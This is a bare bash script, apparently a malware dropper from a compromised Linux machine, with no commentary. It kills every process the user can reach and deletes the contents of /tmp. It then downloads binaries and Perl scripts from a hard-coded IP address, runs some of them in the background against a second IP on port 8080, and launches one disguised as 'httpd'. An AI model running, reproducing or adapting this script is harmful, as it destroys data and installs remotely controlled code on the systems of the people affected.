#!/bin/bash
kill -9 -1
cd /tmp
rm -rf *
rm -rf .a
mkdir .temp
cd .temp
wget 198.170.105.69/cb
chmod +x cb
./cb 210.245.233.251 8080 &
wget 198.170.105.69/https
perl https
curl -o ping.txt http://198.170.105.69/ping.txt
perl ping.txt 210.245.233.251 8080 &
wget 198.170.105.69/httpd
curl -o httpd 198.170.105.69/httpd
rm -rf /tmp/su*
chmod +x httpd
export PATH="."
httpd